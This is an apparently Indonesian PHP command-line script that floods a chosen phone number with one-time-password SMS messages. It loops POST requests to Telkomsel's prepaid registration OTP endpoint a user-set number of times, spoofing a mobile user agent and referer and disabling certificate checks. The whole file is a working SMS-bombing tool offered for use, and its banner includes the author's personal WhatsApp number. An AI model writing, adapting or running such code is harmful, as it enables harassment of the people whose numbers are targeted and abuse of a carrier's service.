<?php
system("clear");
date_default_timezone_set("Asia/Jakarta");
$date = date("d-m-Y H:i:s", time());
echo "\033[0;32m
#################################################
# \e[1;31m            $date  \033[0;32m             #
#  _______   _ _                            _   #
# |__   __| | | |                          | |  #
#    | | ___| | | _____  _ __ ___  ___  ___| |  #
#    | |/ _ \ | |/ / _ \| '_ ` _ \/ __|/ _ \ |  #
#    | |  __/ |   < (_) | | | | | \__ \  __/ |  #
#    |_|\___|_|_|\_\___/|_| |_| |_|___/\___|_|  #
#                                               #
#               [+]author: Danz                 #
#               [+]wa: 085954750359             #
#################################################\n\n";
echo "Nomor => ";
$nomor = trim(fgets(STDIN));
echo "Jumlah?: ";
$jumlah = trim(fgets(STDIN));
echo "Jeda?: ";
$jeda = trim(fgets(STDIN));
$execute = submit($nomor, $jumlah, $jeda);
echo"Done ea Bosq\n";
print $execute;

function submit($no, $jum, $wait)
{
    $x = 0;
    while ($x < $jum) {
        $ch      = curl_init();
        $payload = array ("phone" => $no);
        $js      = json_decode(json_encode($payload),true);
        curl_setopt($ch, CURLOPT_URL,"https://www.telkomsel.com/prepaid_registration/get_otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, "https://www.telkomsel.com/daftar-ulang-prepaid?ch=WEB");
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 9; Redmi Note 4 Build/PQ1A.181205.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("application/x-www-form-urlencoded; charset=UTF-8"));
        $response = curl_exec ($ch);
        curl_close ($ch);
        echo $response."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
?>
